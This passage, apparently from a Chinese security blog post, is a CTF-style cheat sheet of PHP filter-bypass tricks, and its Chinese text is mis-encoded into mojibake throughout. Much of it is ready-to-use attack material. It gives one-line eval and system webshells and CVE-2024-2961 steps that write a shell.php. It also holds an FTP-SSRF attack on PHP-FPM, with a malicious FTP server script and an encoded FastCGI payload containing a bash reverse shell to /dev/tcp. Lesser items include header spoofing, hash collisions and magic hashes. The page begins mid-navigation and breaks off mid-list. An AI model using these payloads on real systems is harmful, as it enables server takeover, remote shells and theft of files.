class="toc-link" href="#opcache"><span class="toc-number">5.51.1.</span> <span class="toc-text">opcache</span></a></li></ol></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-PHPç»•è¿‡" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">PHPç»•è¿‡</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="article-date"><time datetime="2020-05-18T11:29:09.000Z" itemprop="datePublished">2020-05-18</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="article-tag-link-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">ç»•è¿‡</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="leancloud_visitors" data-flag-title="PHPç»•è¿‡"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><p>phpinfo() #PHPé…ç½®é¡µ</p><p>file_get_contents() #è·å–æ–‡ä»¶å†…å®¹</p><p>get_defined_vars() #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼</p><p>â€‹</p><h2 id="å˜ç§ä¸€å¥è¯"><a href="#å˜ç§ä¸€å¥è¯" class="headerlink" title="å˜ç§ä¸€å¥è¯"></a>å˜ç§ä¸€å¥è¯</h2><p><strong>PHP</strong></p><p><code>$_GET[a]($_GET[b]);</code></p><p>â€‹</p><h2 id="å¸¸ç”¨php-filterè¿‡æ»¤å™¨"><a href="#å¸¸ç”¨php-filterè¿‡æ»¤å™¨" class="headerlink" title="å¸¸ç”¨php://filterè¿‡æ»¤å™¨"></a>å¸¸ç”¨php://filterè¿‡æ»¤å™¨</h2><p><strong>æ— è¿‡æ»¤å™¨</strong></p><p><code>php://filter/resource=</code></p><p><strong>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</strong></p><p><code>php://filter/read=string.rot13/resource=</code></p><p><code>php://filter/read=string.toupper/resource=</code></p><p><code>php://filter/read=string.tolower/resource=</code></p><p><code>php://filter/read=string.string_tags/resource=</code></p><p><strong>è½¬æ¢è¿‡æ»¤å™¨</strong></p><p><code>php://filter/read=convert.base64-encode/resource=</code></p><p><code>php://filter/read=convert.quoted-printable-encode/resource=</code></p><p>â€‹</p><h2 id="å¸¸ç”¨è·¯å¾„"><a href="#å¸¸ç”¨è·¯å¾„" class="headerlink" title="å¸¸ç”¨è·¯å¾„"></a>å¸¸ç”¨è·¯å¾„</h2><p><strong>Nginx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—ï¼š</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">é…ç½®ï¼š</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p><strong>Apache</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—ï¼š</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/log/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line"></span><br><span class="line">é…ç½®ï¼š</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf	</span><br></pre></td></tr></table></figure><p><strong>Docker</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¯åŠ¨å‘½ä»¤æ–‡ä»¶ï¼š</span><br><span class="line">/docker-entrypoint.sh</span><br></pre></td></tr></table></figure><p>â€‹</p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="å…³é”®è¯"><a href="#å…³é”®è¯" class="headerlink" title="å…³é”®è¯"></a>å…³é”®è¯</h3><p>å‡½æ•°åã€æ–¹æ³•åã€ç±»åã€å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼š</p><p><code>&lt;?php Show_source(&#39;index.php&#39;);?&gt;</code></p><p>åŠ¨æ€ç‰¹æ€§ï¼š</p><p><code>&lt;?php base64_decode(&#39;c2hvd19zb3VyY2U=&#39;)(&#39;index.php&#39;);?&gt;</code></p><p><code>&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index.php&#39;);?&gt;</code></p><p>16è¿›åˆ¶ï¼š</p><p><code>&lt;?php (&quot;\x70\x68\x70\x69\x6e\x66\x6f&quot;)();?&gt;</code></p><p>åŒå¼•å·æ‰§è¡Œä»£ç ï¼š</p><p><code>&lt;?php echo &quot;$&#123; phpinfo(); &#125;&quot;;</code></p><h3 id="æº¢å‡º"><a href="#æº¢å‡º" class="headerlink" title="æº¢å‡º"></a>æº¢å‡º</h3><p>32ä½ï¼š-2147483648 ~ 2147483647</p><p>64ä½ï¼š-9223372036854775808 ~ 9223372036854775807</p><h3 id="æœ¬åœ°è®¿é—®"><a href="#æœ¬åœ°è®¿é—®" class="headerlink" title="æœ¬åœ°è®¿é—®"></a>æœ¬åœ°è®¿é—®</h3><p>X-Forwarded-For, X-Client-ip, Client-ip, X-Real-IP</p><h3 id="è¯·æ±‚æ–¹æ³•"><a href="#è¯·æ±‚æ–¹æ³•" class="headerlink" title="è¯·æ±‚æ–¹æ³•"></a>è¯·æ±‚æ–¹æ³•</h3><p>æŸ¥çœ‹æ”¯æŒè¯·æ±‚æ–¹æ³•ï¼šOPTIONS</p><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼šPUT</p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><ul><li><p>ç§‘å­¦è®¡æ•°æ³•</p></li><li><p>è¿›åˆ¶è½¬æ¢</p><p>åå…­è¿›åˆ¶ï¼š0x???</p><p>äºŒè¿›åˆ¶ï¼š0b???</p><p>å…«è¿›åˆ¶ï¼š0???</p></li></ul><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><ul><li><p>ç‰¹æ®Šå­—ç¬¦</p><p>ç©ºæ ¼ã€%00ã€%0a</p></li></ul><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><ul><li><p>æ¢è¡Œç¬¦ %0aï¼ˆæŒ‰è¡ŒåŒ¹é…ç±»ï¼‰</p><p>preg_matchå€¼åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œå¯¹äº<code>/^xxx$/</code>ç±»å‹ï¼Œåœ¨å‰ç«¯æˆ–æœ«å°¾åŠ ä¸Š%0aå³å¯ç»•è¿‡ã€‚</p></li><li><p>å‘½åç©ºé—´ï¼ˆ\ï¼‰</p><blockquote><p>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¾‹</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure></blockquote><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡/#function">Code-Breaking Puzzles é¢˜è§£&amp;å­¦ä¹ ç¯‡</a></p></li><li><p>ç¬¦å·</p><ul><li><p>åˆ†å·ï¼š<code>?&gt;</code>é—­åˆ</p></li><li><p>å°æ‹¬å·ï¼š</p><p><code>?c=include $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php</code></p><p><code>?c=require $_GET[x]?&gt;&amp;x=php://filter/read=convert.base64-encode/resource=index.php</code></p></li></ul></li><li><p>æ•°ç»„</p><p>preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„subjectæ˜¯æ•°ç»„æ—¶ä¼šè¿”å›falseã€‚</p></li><li><p>PCREå›æº¯æ¬¡æ•°é™åˆ¶</p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶</a></p><p><code>pcre.backtrack_limit</code>ç»™pcreè®¾å®šäº†ä¸€ä¸ªå›æº¯æ¬¡æ•°ä¸Šé™ï¼Œé»˜è®¤ä¸º1000000ï¼Œå¦‚æœå›æº¯æ¬¡æ•°è¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œpreg_matchä¼šè¿”å›falseã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&#x27;http://x.x.x.x/&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;very&#x27;</span> * <span class="number">250000</span> + <span class="string">&#x27;STRING&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></li></ul><h3 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h3><ul><li><p>å‘½åç©ºé—´ï¼ˆ\ï¼‰</p><blockquote><p>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¾‹</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title class_">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡/#function">Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡</a></p></li></ul><h3 id="SERVER-â€˜QUERY-STRINGâ€™"><a href="#SERVER-â€˜QUERY-STRINGâ€™" class="headerlink" title="$_SERVER[â€˜QUERY_STRINGâ€™]"></a>$_SERVER[â€˜QUERY_STRINGâ€™]</h3><ul><li><p>URLç¼–ç </p><p>$_SERVER[â€˜QUERY_STRINGâ€™]ä¸ä¼šè¿›è¡ŒURLDecodeã€‚</p></li><li><p>å˜é‡è¦†ç›–</p><p><code>?_POST[key1]=36d&amp;_POST[key2]=36d</code></p></li></ul><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ul><li><p>POSTè¦†ç›–</p><p>$_REQUESTåŒæ—¶æ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œå¹¶ä¸”POSTå…·æœ‰æ›´é«˜çš„ä¼˜å…ˆå€¼ï¼Œåªéœ€è¦åŒæ—¶GETå’ŒPOSTæœ‰ç›¸åŒçš„å‚æ•°ï¼Œåœ¨æ£€æµ‹æ—¶POSTçš„å€¼å°±ä¼šè¦†ç›–GETçš„å€¼ä»è€Œç»•è¿‡ã€‚</p></li></ul><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><ul><li><p>ä½¿ç”¨ php://input æˆ– data://text/plain,xxx å†™æ–‡ä»¶</p></li><li><p>æ–‡ä»¶å†…å®¹éœ€æ»¡è¶³å›ºå®šå­—ç¬¦ä¸²ï¼Œæˆ–å›ºå®šå­—ç¬¦ä¸²å‰ç¼€</p><p>filteré“¾æ„é€ ï¼Œç»è¿‡å¤šæ¬¡base64åŠ å¯†å’Œè§£å¯†ï¼Œæ¯æ¬¡ç¼–ç åˆ é™¤åé¢çš„ <code>=</code>ï¼Œæ‰”æ‰åæ–¹çš„è„æ•°æ®ã€‚</p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">Solving â€œincluderâ€™s revengeâ€ from hxp ctf 2021 without controlling any files</a></p><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">PHP filter chain generator</a></p><p><a target="_blank" rel="noopener" href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">idekCTF 2022 - Paywall</a></p></li><li><p>RCE</p><ul><li><p>CVE-2024-2961</p><ul><li><p>è¯»å–<code>/proc/self/maps</code>æ–‡ä»¶</p><p><code>?file=php://filter/read=convert.base64-encode/resource=/proc/self/maps</code></p></li><li><p>è¯»å–<code>libc</code>æ–‡ä»¶</p><p><code>?file=php://filter/read=convert.base64-encode/resource=/lib/x86_64-linux-gnu/libc-2.31.so</code></p></li><li><p>ä½¿ç”¨è„šæœ¬ç”Ÿæˆpayload</p><p><strong>æ–¹æ³•ä¸€</strong></p><p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py</a></p><p>ä¿®æ”¹è„šæœ¬ï¼Œåˆ©ç”¨ã€‚</p><p><strong>æ–¹æ³•äºŒ</strong></p><p><a target="_blank" rel="noopener" href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a></p><p>å°†<code>maps</code>å’Œ<code>libc.so</code>æ”¾å…¥åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä¿®æ”¹è„šæœ¬ï¼Œä¸»è¦ä¿®æ”¹cmdå‘½ä»¤å’Œlibcæ–‡ä»¶åç§°ï¼š</p><p><code>cmd = &quot;echo &#39;&lt;?php system($_GET[1]); ?&gt;&#39; &gt; /var/www/html/shell.php&quot;</code></p><p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°payloadï¼›</p><p>ç›´æ¥è®¿é—®æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥RCEï¼š</p><p><code>/shell.php?cmd=ls</code></p></li></ul></li></ul></li></ul><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><ul><li><p>æ”»å‡»php-fpmï¼ˆæœªæˆæƒè®¿é—®æ¼æ´ï¼‰</p><p>å¦‚æœç›®æ ‡ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œç€ <code>PHP-FPM</code>ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª<code>file_put_contents()</code>å‡½æ•°çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¯ä»¥ä½¿ç”¨ <code>FTP</code> åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå®¢æˆ·ç«¯è¯•å›¾ä»<code>FTP</code>æœåŠ¡å™¨ä¸Šè¯»å–/å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°ä¸€ä¸ªæŒ‡å®šçš„<code>IP</code>å’Œç«¯å£ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šåˆ°<code>127.0.0.1:9000</code>ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºçš„ <code>PHP-FPM</code> å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆ<code>SSRF</code>ã€‚</p><p><code>file_put_contents($_GET[&#39;file&#39;], $_GET[&#39;data&#39;]);</code></p><p>å…ˆç”¨ <code>gopherus</code> ç”Ÿæˆä¸€ä¸ªåå¼¹<code>shell</code>çš„<code>payload</code>ï¼Œæˆªå– <code>_</code> åé¢çš„éƒ¨åˆ†</p><p><code>/var/www/html/index.php</code></p><p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;</code></p><p>å…³äº<code>FTP</code>çš„<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangzhufei/article/details/86177015">è¿”å›ç </a>ï¼Œæˆ‘ä»¬çœ‹åˆ°<code>227</code>ï¼š</p><blockquote><p><code>Entering Passive Mode &lt;h1,h2,h3,h4,p1,p2&gt; è¿›å…¥è¢«åŠ¨æ¨¡å¼(h1,h2,h3,h4,p1,p2)</code></p></blockquote><p>æˆ‘ä»¬å¯ä»¥ç”¨æ¥è¿›å…¥è¢«åŠ¨æ¨¡å¼ï¼Œ<code>h</code>å’Œ<code>p</code>åˆ†åˆ«ä¸ºåœ°å€å’Œç«¯å£ï¼Œæ­å»ºä¸€ä¸ªæ¶æ„çš„ <code>ftp</code> æœåŠ¡å™¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">123</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b&#x27;220 welcome\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;331 Please specify the password.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;230 Login successful.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;200 Switching to Binary mode.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;550 Could not get the file size.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;150 ok\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n&#x27;</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b&#x27;150 Permission denied.\n&#x27;</span>)</span><br><span class="line">conn.send(<span class="string">b&#x27;221 Goodbye.\n&#x27;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡å™¨ä¹‹åå†ç›‘å¬åå¼¹çš„ç«¯å£ï¼š</p><p><code>http://ip:8080/ftp.php?file=ftp://@ip:123/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0F%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F!SCRIPT_FILENAME/usr/share/nginx/html/phpinfo.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ip/1234%200%3E%261%22%27)%3Bdie(%27-----Made-by-SpyD3r-----%0A%27)%3B%3F%3E%00%00%00%00</code></p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://whoamianony.top/2021/10/24/Web%E5%AE%89%E5%85%A8/%E6%95%99%E4%BD%A0%E7%94%A8%20FTP%20SSRF%20%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/">æ•™ä½ ç”¨ FTP SSRF æ‰“ç©¿å†…ç½‘</a></p></li><li><p>arrayç»•è¿‡å…³é”®å­—</p><p>file_put_contentsçš„dataå‚æ•°å¯ä»¥æ˜¯ä¸ªarrayï¼Œå¯ä»¥é€šè¿‡æ„é€ ç‰¹åˆ«çš„getè¯·æ±‚æ¥å‘é€ä¸€ä¸ªdataçš„arrayæ¥ç»•è¿‡ã€‚</p><blockquote><p><code>file_put_contents(file,data,mode,context)</code></p><p>file: å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ•°æ®çš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚</p><p>data: å¯é€‰ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ•°ç»„æˆ–æ•°æ®æµã€‚</p></blockquote></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    params[<span class="string">&#x27;data[&#123;i&#125;]&#x27;</span>.<span class="built_in">format</span>(i=<span class="built_in">str</span>(i))]=<span class="built_in">bytes</span>([s[i]])</span><br></pre></td></tr></table></figure><h3 id="sha1-æ¯”è¾ƒ"><a href="#sha1-æ¯”è¾ƒ" class="headerlink" title="sha1()æ¯”è¾ƒ"></a>sha1()æ¯”è¾ƒ</h3><ul><li><p>ä»¥æ•°ç»„ä¸ºå‚æ•°</p><p>sha1()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹ï¼Œå°†æŠ¥é”™å¹¶è¿”å›falseã€‚</p></li><li><p>ç‰¹æ®Šæƒ…å†µæ±‡æ€»</p><blockquote><p>10932435112: 0e07766915004133176347055865026311692244<br>aaroZmOk: 0e66507019969427134894567494305185566735<br>aaK1STfY: 0e76658526655756207688271159624026011393<br>aaO8zKZF: 0e89257456677279068558073954252716165668<br>aa3OFF9m: 0e36977786278517984959260394024281014729</p><p>0e1290633704: 0e19985187802402577070739524195726831799</p></blockquote></li><li><p>æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™===å¼ºç±»å‹æƒ…å†µï¼‰</p><p>ä¸¤ç»„ç»è¿‡urlç¼–ç åçš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶ç¢°æ’</p><p><a target="_blank" rel="noopener" href="https://github.com/corkami/collisions/tree/master/examples/free">collisions</a></p></li></ul><h3 id="md5-æ¯”è¾ƒ"><a href="#md5-æ¯”è¾ƒ" class="headerlink" title="md5()æ¯”è¾ƒ"></a>md5()æ¯”è¾ƒ</h3><ul><li><p>æ¯”è¾ƒç¼ºé™·åˆ©ç”¨ï¼ˆé™==å¼±ç±»å‹æƒ…å†µï¼‰</p><blockquote><p>QNKCDZO - 0e830400451993494058024219903391</p><p>PJNPDWY: 0e291529052894702774557631701704<br>NWWKITQ: 0e763082070976038347657360817689<br>NOOPCJF: 0e818888003657176127862245791911<br>MMHUWUV: 0e701732711630150438129209816536<br>MAUXXQC: 0e478478466848439040434801845361<br>IHKFRNS: 0e256160682445802696926137988570<br>GZECLQZ: 0e537612333747236407713628225676<br>GGHMVOE: 0e362766013028313274586933780773<br>GEGHBXL: 0e248776895502908863709684713578<br>EEIZDOI: 0e782601363539291779881938479162<br>DYAXWCA: 0e424759758842488633464374063001<br>DQWRASX: 0e742373665639232907775599582643<br>BRTKUJZ: 